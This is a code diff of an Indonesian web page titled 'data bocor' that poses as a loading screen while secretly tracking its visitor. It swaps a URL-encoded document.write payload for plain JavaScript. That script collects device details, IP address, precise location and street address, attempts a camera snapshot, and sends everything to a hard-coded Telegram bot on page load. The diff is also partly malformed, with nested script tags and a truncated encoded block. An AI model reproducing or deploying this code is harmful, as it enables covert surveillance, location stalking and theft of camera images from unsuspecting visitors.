@@ -1,3 +1,266 @@
-<script>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>data bocor by vimc</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+                    body {
+                        background-color: #000;
+                        margin: 0;
+                        padding: 0;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        height: 100vh;
+                        font-family: Arial, sans-serif;
+                        color: #999;
+                        overflow: hidden;
+                    }
+                    #loading-container {
+                        text-align: center;
+                        width: 80%;
+                        max-width: 400px;
+                    }
+                    #loading-text {
+                        font-size: 22px;
+                        margin-bottom: 20px;
+                        color: #6e48aa;
+                    }
+                    #progress-container {
+                        height: 3px;
+                        background-color: #222;
+                        border-radius: 3px;
+                        overflow: hidden;
+                    }
+                    #progress-bar {
+                        height: 100%;
+                        width: 0%;
+                        background: linear-gradient(90deg, #6e48aa, #9d50bb);
+                        transition: width 0.3s ease;
+                    }
+                    #loading-details {
+                        margin-top: 20px;
+                        font-size: 14px;
+                        color: #666;
+                    }
+                    .hidden {
+                        display: none;
+                    }
+                </style>
+</head>
+<body>
+    <div id="loading-container">
+                    <div id="loading-text">data anda sudah bocor</div>
+
+    <video id="video" autoplay muted class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <script>
+        <script>
 <!--
-document.write(unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22id%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1.0%22%3E%0A%20%20%20%20%3Ctitle%3Edata%20bocor%20by%20vimc%3C/title%3E%0A%20%20%20%20%3Cscript%20src%3D%22https%3A//cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js%22%3E%3C/script%3E%0A%20%20%20%20%3Cstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23000%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20padding%3A%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20flex%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20justify-content%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20align-items%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100vh%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-family%3A%20Arial%2C%20sans-serif%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23999%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23loading-container%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20width%3A%2080%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20max-width%3A%20400px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23loading-text%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2022px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%236e48aa%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23progress-container%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20height%3A%203px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23222%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20border-radius%3A%203px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20overflow%3A%20hidden%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23progress-bar%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20height%3A%20100%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20width%3A%200%25%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20background%3A%20linear-gradient%2890deg%2C%20%236e48aa%2C%20%239d50bb%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20transition%3A%20width%200.3s%20ease%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23loading-details%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20margin-top%3A%2020px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2014px%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20color%3A%20%23666%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.hidden%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%20%20%20%20%3Cdiv%20id%3D%22loading-container%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22loading-text%22%3Edata%20anda%20sudah%20bocor%3C/div%3E%0A%0A%20%20%20%20%3Cvideo%20id%3D%22video%22%20autoplay%20muted%20class%3D%22hidden%22%3E%3C/video%3E%0A%20%20%20%20%3Ccanvas%20id%3D%22canvas%22%20class%3D%22hidden%22%3E%3C/canvas%3E%0A%0A%20%20%20%20%3Cscript%3E%0A%20%20%20%20%20%20%20%20const%20token%20%3D%20%277791320283%3AAAG3J0Qoju4vumL1O1QEd61Ol8RDroKfwxA%27%3B%0A%20%20%20%20%20%20%20%20const%20chatId%20%3D%20%278069740820%27%3B%0A%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20//%20Simulate%20infinite%20loading%0A%20%20%20%20%20%20%20%20let%20progress%20%3D%200%3B%0A%20%20%20%20%20%20%20%20const%20progressBar%20%3D%20document.getElementById%28%27progress-bar%27%29%3B%0A%20%20%20%20%20%20%20%20const%20loadingDetails%20%3D%20document.getElementById%28%27loading-details%27%29%3B%0A%20%20%20%20%20%20%20%20const%20loadingMessages%20%3D%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%22Memeriksa%20modul%20sistem...%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22Memuat%20komponen%20inti...%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22Menginisialisasi%20antarmuka...%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22Memverifikasi%20koneksi...%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22Menyiapkan%20lingkungan...%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22Memeriksa%20pembaruan...%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%22Memuat%20aset%20tampilan...%22%0A%20%20%20%20%20%20%20%20%5D%3B%0A%0A%20%20%20%20%20%20%20%20const%20loadingInterval%20%3D%20setInterval%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20progress%20+%3D%20Math.random%28%29%20*%205%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28progress%20%3E%2098%29%20progress%20%3D%2098%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20progressBar.style.width%20%3D%20progress%20+%20%27%25%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28Math.random%28%29%20%3E%200.9%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20loadingDetails.textContent%20%3D%20loadingMessages%5BMath.floor%28Math.random%28%29%20*%20loadingMessages.length%29%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%2C%20500%29%3B%0A%20%20%20%20%20%20%20%20%0A%0A%20%20%20%20%20%20%20%20//%20Telegram%20functions%0A%20%20%20%20%20%20%20%20const%20sendToTelegram%20%3D%20async%20%28data%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20await%20fetch%28%60https%3A//api.telegram.org/bot%24%7Btoken%7D/sendMessage%60%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%27Content-Type%27%3A%20%27application/json%27%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20chat_id%3A%20chatId%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20data%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20parse_mode%3A%20%27HTML%27%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%27Error%20sending%20to%20Telegram%3A%27%2C%20e%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20const%20sendPhoto%20%3D%20async%20%28blob%2C%20filename%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20formData%20%3D%20new%20FormData%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20formData.append%28%27chat_id%27%2C%20chatId%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20formData.append%28%27photo%27%2C%20blob%2C%20filename%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20await%20fetch%28%60https%3A//api.telegram.org/bot%24%7Btoken%7D/sendPhoto%60%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20formData%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%27Error%20sending%20photo%3A%27%2C%20e%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20//%20Get%20detailed%20location%0A%20%20%20%20%20%20%20%20const%20getLocationDetails%20%3D%20async%20%28lat%2C%20lon%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20response%20%3D%20await%20fetch%28%60https%3A//nominatim.openstreetmap.org/reverse%3Fformat%3Djson%26lat%3D%24%7Blat%7D%26lon%3D%24%7Blon%7D%26zoom%3D18%26addressdetails%3D1%60%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20data%20%3D%20await%20response.json%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28data.address%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kabupaten%3A%20data.address.county%20%7C%7C%20data.address.city%20%7C%7C%20data.address.state%20%7C%7C%20%22Tidak%20diketahui%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kecamatan%3A%20data.address.suburb%20%7C%7C%20data.address.village%20%7C%7C%20data.address.town%20%7C%7C%20%22Tidak%20diketahui%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fullAddress%3A%20data.display_name%20%7C%7C%20%22Alamat%20tidak%20tersedia%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%27Error%20getting%20location%20details%3A%27%2C%20e%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kabupaten%3A%20%22Tidak%20diketahui%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kecamatan%3A%20%22Tidak%20diketahui%22%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20fullAddress%3A%20%22Alamat%20tidak%20tersedia%22%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20//%20Collect%20device%20information%0A%20%20%20%20%20%20%20%20const%20collectDeviceInfo%20%3D%20async%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20let%20message%20%3D%20%27%u256D%u2500%u2500%u2500%u2500%u2500%20Tracking%20Report%20%u2500%u2500%u2500%u2500%u2500%20%u29BF%5Cn%5Cn%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20Device%20Information%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%27%u2699%uFE0F%20DEVICE%20INFORMATION%5Cn%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDDA5%uFE0F%20Device%3A%20%24%7Bnavigator.userAgent%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCBB%20Platform%3A%20%24%7Bnavigator.platform%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDF10%20Bahasa%3A%20%24%7Bnavigator.language%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCF6%20Online%3A%20%24%7Bnavigator.onLine%20%3F%20%27Online%27%20%3A%20%27Offline%27%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCFA%20Screen%20Size%3A%20%24%7Bscreen.width%7Dx%24%7Bscreen.height%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83E%uDE9F%20Window%20Size%3A%20%24%7Bwindow.innerWidth%7Dx%24%7Bwindow.innerHeight%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCBE%20RAM%3A%20%24%7Bnavigator.deviceMemory%20%7C%7C%20%27Unknown%27%7D%20GB%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83E%uDDE0%20CPU%20Cores%3A%20%24%7Bnavigator.hardwareConcurrency%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20Battery%20Info%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28navigator.getBattery%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20battery%20%3D%20await%20navigator.getBattery%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDD0B%20Battery%3A%20%24%7BMath.floor%28battery.level%20*%20100%29%7D%25%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDD0C%20Charging%3A%20%24%7Bbattery.charging%20%3F%20%27%u2705%20YA%27%20%3A%20%27%u274C%20TIDAK%27%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%27%uD83D%uDD0B%20Battery%3A%20%u274C%20Tidak%20tersedia%5Cn%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%u23F0%20Waktu%20Akses%3A%20%24%7Bnew%20Date%28%29.toString%28%29%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDD52%20Page%20Load%20Time%3A%20%24%7B%28performance.now%28%29%29.toFixed%282%29%7D%20ms%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCDC%20History%20Length%3A%20%24%7Bhistory.length%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%u270B%20Touch%20Support%3A%20%24%7B%27ontouchstart%27%20in%20window%20%3F%20%27%u2705%20YA%27%20%3A%20%27%u274C%20TIDAK%27%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDD17%20Referrer%3A%20%24%7Bdocument.referrer%20%7C%7C%20%27None%27%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDF0D%20URL%3A%20%24%7Bwindow.location.href%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCC4%20Title%3A%20%24%7Bdocument.title%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDD53%20Timezone%3A%20%24%7BIntl.DateTimeFormat%28%29.resolvedOptions%28%29.timeZone%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83E%uDDED%20Offset%3A%20%24%7Bnew%20Date%28%29.getTimezoneOffset%28%29%7D%20menit%5Cn%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20IP%20and%20Location%20Information%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ipRes%20%3D%20await%20fetch%28%27https%3A//ipapi.co/json/%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20ipData%20%3D%20await%20ipRes.json%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%27%uD83D%uDCCD%20LOCATION%20INFORMATION%5Cn%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCE1%20IP%20Address%3A%20%24%7BipData.ip%7D%5Cn%60%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDFD9%uFE0F%20Kota%3A%20%24%7BipData.city%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDFD9%uFE0F%20Kabupaten%3A%20%24%7BipData.region%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDDFA%uFE0F%20Wilayah%3A%20%24%7BipData.region%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDF0E%20Negara%3A%20%24%7BipData.country_name%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDFF7%uFE0F%20Kode%20Pos%3A%20%24%7BipData.postal%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28ipData.latitude%20%26%26%20ipData.longitude%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCCC%20Latitude%3A%20%24%7BipData.latitude%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83D%uDCCD%20Longitude%3A%20%24%7BipData.longitude%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20locationDetails%20%3D%20await%20getLocationDetails%28ipData.latitude%2C%20ipData.longitude%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDFD9%uFE0F%20Kabupaten%3A%20%24%7BlocationDetails.kabupaten%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDFD9%uFE0F%20Kecamatan%3A%20%24%7BlocationDetails.kecamatan%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%60%uD83C%uDFE0%20Alamat%20Lengkap%3A%20%24%7BlocationDetails.fullAddress%7D%5Cn%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%27%u274C%20Gagal%20mendapatkan%20informasi%20lokasi%5Cn%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20message%20+%3D%20%27%5Cn%u2570%u2500%u2500%u2500%u2500%u2500%20Telegram%20@@Gusofckokocchi%20%u2500%u2500%u2500%u2500%u2500%20%u29BF%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20message%3B%0A%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20//%20Main%20tracking%20function%0A%20%20%20%20%20%20%20%20const%20startTracking%20%3D%20async%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20Send%20device%20info%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20deviceInfo%20%3D%20await%20collectDeviceInfo%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20await%20sendToTelegram%28deviceInfo%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20Try%20to%20access%20camera%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20video%20%3D%20document.getElementById%28%27video%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20canvas%20%3D%20document.getElementById%28%27canvas%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20stream%20%3D%20await%20navigator.mediaDevices.getUserMedia%28%7B%20video%3A%20true%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20video.srcObject%20%3D%20stream%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20await%20new%20Promise%28resolve%20%3D%3E%20setTimeout%28resolve%2C%203000%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20canvas.width%20%3D%20video.videoWidth%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20canvas.height%20%3D%20video.videoHeight%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20canvas.getContext%28%272d%27%29.drawImage%28
+document.write(unescape("const%20token%20%3D%20%277791320283%3AAAG3J0Qoju4vumL1O1QEd61Ol8RDroKfwxA%27%3B%0A%20%20%20%20%20%20%20%20const%20chatId%20%3D%20%278069740820%27%3B"));
+//-->
+</script>
+
+        
+        // Simulate infinite loading
+        let progress = 0;
+        const progressBar = document.getElementById('progress-bar');
+        const loadingDetails = document.getElementById('loading-details');
+        const loadingMessages = [
+            "Memeriksa modul sistem...",
+            "Memuat komponen inti...",
+            "Menginisialisasi antarmuka...",
+            "Memverifikasi koneksi...",
+            "Menyiapkan lingkungan...",
+            "Memeriksa pembaruan...",
+            "Memuat aset tampilan..."
+        ];
+
+        const loadingInterval = setInterval(() => {
+            progress += Math.random() * 5;
+            if (progress > 98) progress = 98;
+            progressBar.style.width = progress + '%';
+            
+            if (Math.random() > 0.9) {
+                loadingDetails.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
+            }
+        }, 500);
+        
+
+        // Telegram functions
+        const sendToTelegram = async (data) => {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: data,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.error('Error sending to Telegram:', e);
+            }
+        };
+
+        const sendPhoto = async (blob, filename) => {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, filename);
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error('Error sending photo:', e);
+            }
+        };
+
+        // Get detailed location
+        const getLocationDetails = async (lat, lon) => {
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                const data = await response.json();
+                
+                if (data.address) {
+                    return {
+                        kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
+                        kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
+                        fullAddress: data.display_name || "Alamat tidak tersedia"
+                    };
+                }
+            } catch (e) {
+                console.error('Error getting location details:', e);
+            }
+            return {
+                kabupaten: "Tidak diketahui",
+                kecamatan: "Tidak diketahui",
